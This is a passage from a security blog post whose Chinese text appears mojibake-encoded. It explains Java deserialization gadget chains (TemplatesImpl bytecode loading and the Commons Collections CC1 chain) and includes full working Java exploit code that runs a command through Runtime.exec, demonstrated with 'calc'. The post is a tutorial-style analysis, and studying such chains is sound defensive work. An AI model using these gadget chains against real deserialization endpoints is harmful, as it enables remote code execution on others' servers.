<li>ç¬¬ä¸€ä¸ª <code>&#123;&#125;</code> ä»‹äº <code>super()</code> å’Œæ„é€ å‡½æ•°å†…å®¹ä¹‹é—´ã€‚</li>
<li>ç¬¬äºŒä¸ª <code>static&#123;&#125;</code> åœ¨æœ€å‰é¢ã€‚</li>
<li>ç¬¬ä¸‰ä¸ªåˆ™æ˜¯æ„é€ å‡½æ•°çš„å†…å®¹ï¼Œç›¸å¯¹äºå‰é¢ä¸¤ä¸ªåœ¨æœ€åé¢ã€‚</li>
</ul>
<p>ä½†è¿™å¹¶ä¸æ˜¯é‡ç‚¹ï¼Œé‡ç‚¹æ˜¯ä¸€æ—¦è°ƒç”¨äº† <code>newInstance</code> æ–¹æ³•ï¼Œè¿™ä¸‰ä¸ªåˆå§‹åŒ–ä¸­çš„å†…å®¹éƒ½ä¼šè¢«æ‰§è¡Œã€‚</p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥å¯ä»¥çœ‹ <code>TemplatesImpl</code> ç±»çš„ <code>getTransletInstance</code> æ–¹æ³•(<code>jdk1.8.0_11</code>)ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150322107.png" alt="image-20220215032214007"> </p>
<p>è¿™é‡Œå­˜åœ¨å¯¹ <code>newInstance</code> æ–¹æ³•çš„è°ƒç”¨ï¼Œé‚£ä¹ˆæ•´ä½“æ€è·¯å°±æ¯”è¾ƒæ˜ç™½äº†ï¼Œæ„é€ åˆé€‚çš„ç±»ï¼Œé€šè¿‡ç§ç§æ–¹æ³•æœ€ç»ˆæ¥åˆ° <code>_class[_transletIndex].newInstance()</code> ã€‚</p>
<h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="- åˆ†æ -"></a>- åˆ†æ -</h4><p>å…ˆæ¥çœ‹åœ¨ <code>_class[_transletIndex].newInstance()</code> ä»£ç ä¸­çš„ <code>_class</code> å±æ€§çš„å€¼ï¼Œè¿™ä¸ª <code>_class</code> å±æ€§çš„å€¼å†…å®¹æ¥è‡ª <code>defineTransletClasses</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150325308.png" alt="image-20220215032535170"></p>
<p>è€Œ <code>loader.defineClass</code> ä»¥ <code>_bytecodes</code> å±æ€§ä½œä¸ºå‚æ•°è¿›è¡Œè°ƒç”¨å¾—åˆ°çš„ç»“æœï¼Œæ˜¾ç„¶ <code>_bytecodes</code> å±æ€§çš„å€¼ä¸ºç±»çš„å­—èŠ‚ç ã€‚</p>
<p>å†ç¯é¡¾ <code>TemplatesImpl</code> æ•´ä¸ªç±»ï¼Œåœ¨ <code>newTransformer</code> æ–¹æ³•å­˜åœ¨å¯¹ <code>defineTransletClasses</code> æ–¹æ³•çš„è°ƒç”¨ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150341634.png" alt="image-20220215033938851"></p>
<p>åŒæ—¶ <code>getOutputProperties</code> æ–¹æ³•å­˜åœ¨å¯¹ <code>newTransformer</code> æ–¹æ³•çš„è°ƒç”¨ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150342996.png" alt="image-20220215034044278"></p>
<p>å¦å¤–ï¼Œåœ¨ <code>TrAXFilter</code> ç±»çš„æ„é€ æ–¹æ³•ã€ <code>TransformerFactoryImpl</code> ç±»çš„ <code>newTransformerHandler</code> æ–¹æ³•</p>
<p>éƒ½å¯ä»¥é€šè¿‡åˆç†çš„æ„é€ ä»¥è¾¾åˆ°å¯¹ <code>TemplatesImpl</code> ç±»ä¸­ <code>newTransformer</code> æ–¹æ³•çš„è°ƒç”¨ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ã€‚</p>
<p>é‚£ä¹ˆå›åˆ° <code>TemplatesImpl</code> ç±»çš„ <code>newTransformer</code> æ–¹æ³•ï¼Œç”±äºå‰é¢æ˜¯æ²¡æœ‰å¤šä½™çš„æ¡ä»¶åˆ¤æ–­ï¼Œç›´æ¥è·Ÿè¿› <code>getTransletInstance</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150355375.png" alt="image-20220215035530284"></p>
<p>é¦–å…ˆ <code>_name</code> å’Œ <code>_class</code> å±æ€§çš„å€¼å¿…é¡»è¦ä¸º <code>null</code> ï¼Œç»§ç»­è·Ÿè¿› <code>defineTransletClasses</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150358039.png" alt="image-20220215035853889"></p>
<p>æ˜¾ç„¶ï¼Œ<code>_bytecodes</code> å±æ€§å¿…ä¸ä¸º <code>null</code> ä¸”éœ€è¦ä¸ºå¤§å°å¤§äº <code>1</code> çš„äºŒç»´æ•°ç»„ï¼Œä»¥ä¾¿è®© <code>_auxClasses</code> å±æ€§èƒ½å¤Ÿæ‰§è¡Œ <code>_auxClasses = new Hashtable()</code> è¿›è¡Œåˆå§‹åŒ–ã€‚ç„¶åè®© <code>_transletIndex</code> å±æ€§è®¾ä¸º <code>0</code> ï¼ŒåŒæ—¶ä¿è¯ <code>_bytecodes</code> å±æ€§çš„å€¼å¦‚ğŸ‘‡</p>
<ul>
<li><code>[0][]&#123;payloadå†…å®¹å­—èŠ‚ç &#125;</code></li>
<li><code>[1][]&#123;ä»»æ„ç±»&#125;</code></li>
<li><code>......</code></li>
</ul>
<p>è‡³äº <code>_transletIndex</code> çš„å€¼ä¸ºä»€ä¹ˆä¸º <code>0</code> æ˜¯æ–¹ä¾¿åé¢æ‰§è¡Œ <code>_class[_transletIndex].newInstance()</code> æ—¶èƒ½ä» <code>_class[0]</code> ä¸­è¯»åˆ° <code>payloadå†…å®¹å­—èŠ‚ç </code> ã€‚å½“ç„¶ï¼Œå¦‚æœä¸æŒ‰ç…§ä¸Šé¢çš„æ ¼å¼åªè¦ <code>_transletIndex</code> çš„å€¼èƒ½å¤Ÿå¯¹çš„ä¸Š <code>_bytecodes</code> å±æ€§æ‰€æ”¾ <code>payloadå†…å®¹å­—èŠ‚ç </code> çš„ç´¢å¼•ä¹Ÿå¯ã€‚</p>
<p>åŒæ—¶ <code>TemplatesImpl</code> ç±»ä¹Ÿæ˜¯å¯ä»¥åºåˆ—åŒ–çš„ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150419055.png" alt="image-20220215041907968"></p>
<p>æœ€åï¼Œç±»çš„ <code>å­—èŠ‚ç </code> çš„ç”Ÿæˆå¯ä»¥ç”¨ <code>javassist</code> ã€‚</p>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="- payload -"></a>- payload -</h4><p>å…ˆæ˜¯ç›´æ¥ä¸€ç‚¹çš„ <code>payload</code> ï¼Œæ¯”å¦‚ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç”Ÿæˆæ¶æ„javaå­—èŠ‚ç </span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        CtClass[] cs = <span class="keyword">new</span> CtClass[]&#123;</span><br><span class="line">                pool.makeClass(<span class="string">&quot;a&quot;</span> + System.nanoTime()),</span><br><span class="line">                pool.makeClass(<span class="string">&quot;b&quot;</span> + System.nanoTime())</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;).waitFor();&quot;</span>;</span><br><span class="line"></span><br><span class="line">        cs[<span class="number">0</span>].makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[][] bc = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">                cs[<span class="number">0</span>].toBytecode(),</span><br><span class="line">                cs[<span class="number">1</span>].toBytecode()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–templateså¹¶é€šè¿‡åå°„èµ‹å€¼</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bc);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;dqv5&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">        <span class="comment">//templates.getOutputProperties();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç”±äº <code>TemplatesImpl</code> ç±»æœ¬èº«æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ï¼Œå› æ­¤ä»¥ä¸Šçš„ <code>payload</code> ä¹Ÿæ˜¯å¯ä»¥ç”¨æ¥ <code>ååºåˆ—åŒ–</code> ã€‚ </p>
<h2 id="CCé“¾"><a href="#CCé“¾" class="headerlink" title="- CCé“¾ -"></a>- CCé“¾ -</h2><p>æ³¨æ„å•¦æ³¨æ„å•¦ï¼Œé‡ç‚¹æ¥äº†(å•ªå—’å•ªå—’â€¦)ã€‚</p>
<h3 id="CC1"><a href="#CC1" class="headerlink" title="- CC1 -"></a>- CC1 -</h3><p>å®éªŒç¯å¢ƒï¼š</p>
<ul>
<li><code>jdk1.7.0_02</code></li>
<li><code>commons.collections 3.2.0</code></li>
</ul>
<h4 id="è°ƒç”¨ç»“æ„"><a href="#è°ƒç”¨ç»“æ„" class="headerlink" title="- è°ƒç”¨ç»“æ„ -"></a>- è°ƒç”¨ç»“æ„ -</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	(Map)Proxy.entrySet()</span><br><span class="line">	ğŸ‘‡</span><br><span class="line">	(Map)Proxy.invoke() &lt;=&gt; AnnotationInvocationHandler.invoke()</span><br><span class="line">		ğŸ‘‡</span><br><span class="line">		LazyMap.get()</span><br><span class="line">		ğŸ‘‡</span><br><span class="line">		ChainedTransformer.transform()</span><br><span class="line">		ğŸ‘‡</span><br><span class="line">		ConstantTransformer.transform() =&gt; Runtime.<span class="keyword">class</span> </span><br><span class="line">        ğŸ‘‡</span><br><span class="line">        InvokerTransformer.transform() =&gt; Runtime.getRuntime</span><br><span class="line">        ğŸ‘‡</span><br><span class="line">        InvokerTransformer.transform() =&gt; Runtime.getRuntime()</span><br><span class="line">        ğŸ‘‡</span><br><span class="line">        InvokerTransformer.tarnsform() =&gt; Runtime.getRuntime().<span class="built_in">exec</span>()</span><br><span class="line">		</span><br></pre></td></tr></table></figure>
<h4 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="- åˆ†æ -"></a>- åˆ†æ -</h4><p>æ˜¾ç„¶ååŠéƒ¨åˆ†å³ä¸ºæœ‰å…³ <code>Transformer</code> çš„è°ƒç”¨ <code>payload</code> äº†ï¼Œè€Œä½¿ç”¨æœ‰å…³ <code>Transformer</code> çš„è°ƒç”¨ <code>payload</code> è§¦å‘çš„é‡ç‚¹æ˜¯æ‰¾åˆ° <code>[(Transformer)å¯æ§].transform()</code> çš„ç»“æ„ã€‚</p>
<p>å…ˆçœ‹ <code>LazyMap</code> ç±»çš„ <code>get</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150520725.png" alt="image-20220215052011650"></p>
<p>è¿™é‡Œ <code>Object value = this.factory.transform(key)</code> ä¸­ <code>this.factory</code> å±æ€§çš„å€¼æ˜¯å¯ä»¥é€šè¿‡åºåˆ—åŒ–æ§åˆ¶çš„ï¼Œä¸”ç±»å‹ä¸º <code>Tranformer</code> æ¥å£ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150521816.png" alt="image-20220215052144739"></p>
<p>æ³¨æ„çœ‹ <code>LazyMap</code> è¿™ä¸ªç±»è¿˜å®ç°äº† <code>Map</code> æ¥å£ã€‚</p>
<p>é‚£ä¹ˆç°åœ¨çš„å…³æ³¨ç‚¹å°±æ¥åˆ°äº†å¯»æ‰¾ <code>[å¯æ§].get()</code> çš„ç»“æ„ï¼Œç›´æ¥è·Ÿè¿› <code>AnnotationInvocationHandler</code> ç±»ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150527234.png" alt="image-20220215052715091"></p>
<p>å¯è§ <code>AnnotationInvocationHandler</code> ç±»æ˜¯å®ç°äº† <code>InvocationHandler</code> æ¥å£ï¼Œä¸”å¯é€šè¿‡åºåˆ—åŒ–æ§åˆ¶ <code>memberValues</code> å±æ€§çš„å€¼ã€‚è€Œ <code>memberValues</code> å±æ€§çš„ç±»å‹ä¸º <code>Map</code> ï¼Œä¹Ÿå°±å¯ä»¥é€šè¿‡å°† <code>LazyMap</code> èµ‹å€¼ç»™å®ƒä»è€Œå®ç°æ§åˆ¶ï¼Œå¹¶ä¸”åœ¨ <code>invoke</code> æ–¹æ³•ä¸­å­˜åœ¨å¯¹ <code>this.memberValues.get(var4)</code> çš„è°ƒç”¨ã€‚</p>
<p>å‡è‹¥ç”¨ <code>AnnotationInvocationHandler</code> ç±»æ„é€ ä¸€ä¸ªåˆé€‚çš„ä»£ç†ï¼Œå½“è¿™ä¸ªä»£ç†è¢«è°ƒç”¨æ—¶ä¹Ÿå°±ä¼šç”± <code>this.memberValues.get(var4)</code> è‡³ <code>Object value = this.factory.transform(key)</code>ï¼Œè¿›è€Œè§¦å‘æœ‰å…³ <code>Transformer</code> è°ƒç”¨çš„ <code>payload</code>  ã€‚</p>
<p>æ¥ä¸‹æ¥çš„å…³é”®ç‚¹ä¹Ÿå°±æ¥åˆ°äº†å¦‚ä½•æ‰¾åˆ°ä¸€ä¸ª <code>[(Map)å¯æ§].[ä»»æ„æ–¹æ³•]</code> çš„ç»“æ„ï¼Œè€Œåœ¨ <code>AnnotationInvocationHandler</code> çš„ <code>readObject</code> ä¸­åˆšå¥½å°±æœ‰ä¸€ä¸ªğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150536765.png" alt="image-20220215053653640"></p>
<p>ç›¸å½“äº <code>[(Map)å¯æ§].entrySet()</code> çš„è°ƒç”¨ã€‚</p>
<p>æ­¤æ—¶ä¹Ÿå°±å¯ä»¥å¤§è‡´ç†è§£è¿™ä¸ª <code>CC1</code> é“¾æ¡çš„æ„æˆäº†ï¼Œåªæ˜¯è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ <code>this.type</code> è¿™é‡Œä¼šè¿›è¡Œå¤„ç†ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150547965.png" alt="image-20220215054741875"></p>
<p>è€Œ <code>this.type</code> å±æ€§ç±»å‹ä¸º <code>Class&lt;? extends Annotation&gt;</code> ï¼Œåƒ <code>Documented</code> ä¹‹ç±»çš„æ³¨è§£ç±»å°±å¯ä»¥é€šè¿‡äº†ã€‚ </p>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="- payload -"></a>- payload -</h4><p>æ ¸å¿ƒåº”è¯¥æ˜¯åœ¨äºæœ‰å…³ä»£ç†çš„æ„é€ ï¼Œç®€å•æ¥è¯´å°±æ˜¯éœ€è¦å®ä¾‹åŒ–ä¸¤ä¸ª <code>AnnotationInvocationHandler</code> ç±»ğŸ‘‡</p>
<ul>
<li>ç¬¬ä¸€ä¸ª <code>AnnotationInvocationHandler</code> ç±»ä½œä¸º <code>Map</code> ç±»å‹çš„ä»£ç†ï¼Œå…¶ <code>memberValues</code> å±æ€§å­˜æ”¾ç›¸å…³ <code>Transformer</code> çš„è°ƒç”¨ <code>payload</code> ã€‚</li>
<li>ç¬¬äºŒä¸ª <code>AnnotationInvocationHandler</code> ç±»ä½œä¸º <code>ååºåˆ—åŒ–</code> çš„è½½ä½“ï¼Œå…¶ <code>memberValues</code> å±æ€§å­˜æ”¾ä½œä¸ºä»£ç†çš„ç¬¬ä¸€ä¸ª <code>AnnotationInvocationHandler</code> ç±»ã€‚</li>
</ul>
<p>ä»¥ä¸‹æ˜¯ç›¸å…³ <code>payload</code> ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Documented;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ChainedTransformer <span class="title">getTransformerChain</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        Transformer[] tfs = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ChainedTransformer(tfs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Class aih = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor aihC = aih.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihC.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç”Ÿæˆæœ‰å…³Transformerçš„payload</span></span><br><span class="line">        Map map = LazyMap.decorate(<span class="keyword">new</span> HashMap(), getTransformerChain(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬ä¸€ä¸ªAnnotationInvocationHandlerä½œä¸ºä»£ç†</span></span><br><span class="line">        InvocationHandler aihC1 = (InvocationHandler) aihC.newInstance(Documented.class, map);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(aih.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, aihC1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬äºŒä¸ªAnnotationInvocationHandlerä½œä¸ºè½½ä½“</span></span><br><span class="line">        Object aihC2 = aihC.newInstance(Documented.class, proxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–æµ‹è¯•</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(aihC2);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202150651599.png" alt="image-20220215065149375"></p>
<p>æ˜¯æˆåŠŸäº†ã€‚</p>
<h4 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="- æ‰©å±• -"></a>- æ‰©å±• -</h4><p>å½“ç„¶ï¼Œé™¤äº†ç”¨ <code>AnnotationInvocationHandler</code> åšè½½ä½“ï¼Œä»»ä½•ä¸€ä¸ªå¯ä»¥æ”¯æŒåºåˆ—åŒ–ä¸”å­˜åœ¨å½¢å¦‚ <code>[(Map)å¯æ§].[ä»»æ„æ–¹æ³•]</code> çš„ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ¯”å¦‚ <code>Collections</code> ç±»ä¸­çš„ <code>SetFromMap</code> ç±»ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Documented;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span 